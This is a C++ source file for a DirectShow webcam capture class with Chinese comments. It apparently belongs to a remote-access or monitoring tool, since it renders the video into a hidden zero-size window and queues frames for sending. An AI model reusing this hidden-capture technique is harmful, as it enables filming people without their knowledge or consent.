// CaptureVideo.cpp: implementation of the CCaptureVideo class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "CaptureVideo.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
CSampleGrabberCB mCB;

CCaptureVideo::CCaptureVideo()
{
	if(FAILED(CoInitialize(NULL)))
	{
		return;
	}
	m_pCapture = NULL;
	m_pGB = NULL;
	m_pMC = NULL;
	m_pVW = NULL;
	m_bExit = FALSE;
}

CCaptureVideo::~CCaptureVideo()
{
	m_bExit = TRUE;
	if(m_pMC)m_pMC->StopWhenReady();
	if(m_pVW){
		m_pVW->put_Visible(OAFALSE);
		m_pVW->put_Owner(NULL);
	}
	SAFE_RELEASE(m_pMC);
	SAFE_RELEASE(m_pVW);
	SAFE_RELEASE(m_pGB);
	SAFE_RELEASE(m_pBF);
	SAFE_RELEASE(m_pGrabber);
	SAFE_RELEASE(m_pCapture);

	CoUninitialize() ; 
}

HRESULT CCaptureVideo::Open(int iDeviceID,int iPress)
{
	printf("CCaptureVideo call Open\n");
	HRESULT hResult = S_OK;
	do 
	{
		hResult = InitCaptureGraphBuilder();
		if (FAILED(hResult))
			break;
		if(!BindVideoFilter(iDeviceID, &m_pBF))
			break;

		hResult = m_pGB->AddFilter(m_pBF, L"Capture Filter");

		hResult = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, 
			IID_ISampleGrabber, (void**)&m_pGrabber);   //引脚内存
		if(FAILED(hResult))
			break;

		//m_pGrabber 属性设置   1 格式   2 内存缓冲形式
		CComQIPtr<IBaseFilter, &IID_IBaseFilter> pGrabBase(m_pGrabber);//设置视频格式
		AM_MEDIA_TYPE mt;    //视频格式
		ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
		mt.majortype = MEDIATYPE_Video;
		mt.subtype = MEDIASUBTYPE_RGB24; // MEDIASUBTYPE_RGB24

		hResult = m_pGrabber->SetMediaType(&mt);
		if(FAILED(hResult))
			break;
		
		hResult = m_pGB->AddFilter(pGrabBase,L"Grabber");

		if(FAILED(hResult))
			break;

		hResult = m_pCapture->RenderStream(&PIN_CATEGORY_PREVIEW,    //静态
			&MEDIATYPE_Video,m_pBF,pGrabBase,NULL);	
		if(FAILED(hResult))
		{
			//扑捉
			hResult = m_pCapture->RenderStream(&PIN_CATEGORY_CAPTURE,&MEDIATYPE_Video,m_pBF,pGrabBase,NULL);
			break;
		}

		if(FAILED(hResult))
			break;	
		
		hResult = m_pGrabber->GetConnectedMediaType(&mt); 

		if (FAILED(hResult))
			break;

		//3  扑捉数据  FDO 一旦有数据就进行 回调函数调用 属于一个类

		VIDEOINFOHEADER * vih = (VIDEOINFOHEADER*) mt.pbFormat;   
		//mCB 是个另外一个类 并且全局变量 有个回调
		mCB.m_ulFullWidth = vih->bmiHeader.biWidth;
		mCB.m_ulFullHeight = vih->bmiHeader.biHeight;

		FreeMediaType(mt);

		hResult = m_pGrabber->SetBufferSamples( FALSE );  //回调函数
		hResult = m_pGrabber->SetOneShot( FALSE );

		//设置视频捕获回调函数 也就是如果有视频数据时就会调用这个类的BufferCB函数

		//返回OnTimer
		hResult = m_pGrabber->SetCallback(&mCB, 1); 

		m_hWnd = CreateWindow("#32770", "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

		SetupVideoWindow();   //屏蔽窗口

		hResult = m_pMC->Run();    //开灯   

		if(FAILED(hResult))
			break;
	} while (false);

	printf("CCaptureVideo Open %s\n", FAILED(hResult) ? "failed" : "succeed");

	return hResult;
}


HRESULT CCaptureVideo::InitCaptureGraphBuilder()
{
	HRESULT hResult = CoCreateInstance(CLSID_CaptureGraphBuilder2 , NULL, CLSCTX_INPROC,
		IID_ICaptureGraphBuilder2, (void**)&m_pCapture);   //真实设备

	if (FAILED(hResult))
	{
		return hResult;
	}

	hResult=CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, 
		IID_IGraphBuilder, (void**)&m_pGB);   //虚拟设备  

	if (FAILED(hResult))
	{
		return hResult;
	}
	//将过滤绑定到真实设备上面
	m_pCapture->SetFiltergraph(m_pGB);	
	hResult = m_pGB->QueryInterface(IID_IMediaControl,(LPVOID*)&m_pMC);
	if (FAILED(hResult))
	{
		return hResult;
	}

	hResult = m_pGB->QueryInterface(IID_IVideoWindow,(LPVOID*) &m_pVW);
	if (FAILED(hResult))
	{
		return hResult;
	}
	return hResult;
}

LPBITMAPINFO CCaptureVideo::GetBmpInfor()
{
	return mCB.GetBmpInfor();     //构建位图内存头和数据
}

BOOL CCaptureVideo::BindVideoFilter(int deviceId, IBaseFilter **pFilter)
{
	if (deviceId < 0)
		return FALSE;// enumerate all video capture devices
	CComPtr<ICreateDevEnum> pCreateDevEnum;
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,
		IID_ICreateDevEnum, (void**)&pCreateDevEnum);
	if (hr != NOERROR)
	{
		return FALSE;
	}
	CComPtr<IEnumMoniker> pEm;
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory,&pEm, 0);
	if (hr != NOERROR) 
	{
		return FALSE;
	}
	pEm->Reset();
	ULONG cFetched;
	IMoniker *pM;
	int index = 0;
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK, index <= deviceId)
	{
		IPropertyBag *pBag;  
		//通过BindToStorage 可以访问该设备的标识集
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		if(SUCCEEDED(hr)) 
		{
			VARIANT var;
			var.vt = VT_BSTR;
			hr = pBag->Read(L"FriendlyName", &var, NULL);
			if (hr == NOERROR) 
			{
				if (index == deviceId)
				{
					pM->BindToObject(0, 0, IID_IBaseFilter, (void**)pFilter);
				}
				SysFreeString(var.bstrVal);
			}
			pBag->Release();  //引用计数--
		}
		pM->Release();
		index++;
	}
	return TRUE;
}


void CCaptureVideo::FreeMediaType(AM_MEDIA_TYPE& mt)
{
	if (mt.cbFormat != 0) {
		CoTaskMemFree((PVOID)mt.pbFormat);
		mt.cbFormat = 0;
		mt.pbFormat = NULL;
	}
	if (mt.pUnk != NULL) {
		mt.pUnk->Release();
		mt.pUnk = NULL;
	}
}


HRESULT CCaptureVideo::SetupVideoWindow()
{
	HRESULT hr;
	hr = m_pVW->put_Owner((OAHWND)m_hWnd);
	if (FAILED(hr))return hr;
	hr = m_pVW->put_WindowStyle(WS_CHILD | WS_CLIPCHILDREN);
	if (FAILED(hr))return hr;
	ResizeVideoWindow();
	hr = m_pVW->put_Visible(OATRUE);
	return hr;
}

void CCaptureVideo::ResizeVideoWindow()
{
	if (m_pVW){
		RECT rc;
		::GetClientRect(m_hWnd,&rc);
		m_pVW->SetWindowPosition(0, 0, rc.right, rc.bottom);  //将窗口设置到0 0 0 0 处
	} 
}

void  CCaptureVideo::SendEnd()            //发送结束  设置可以再取数据
{
	InterlockedExchange((LPLONG)&mCB.bStact,CMD_CAN_COPY);
}

LPBYTE CCaptureVideo::GetDIB(DWORD& dwSize)
{
	BYTE *szBuffer = NULL;
	int n = 200; // 10s没有获取到数据则返回NULL
	do 
	{
		if (mCB.bStact==CMD_CAN_SEND) //这里改变了一下发送的状态
		{
			if (szBuffer = mCB.GetNextScreen(dwSize)) //是否获取到视频
				break;
		}
		Sleep(50);
	} while (!m_bExit && --n);

	return szBuffer;
}
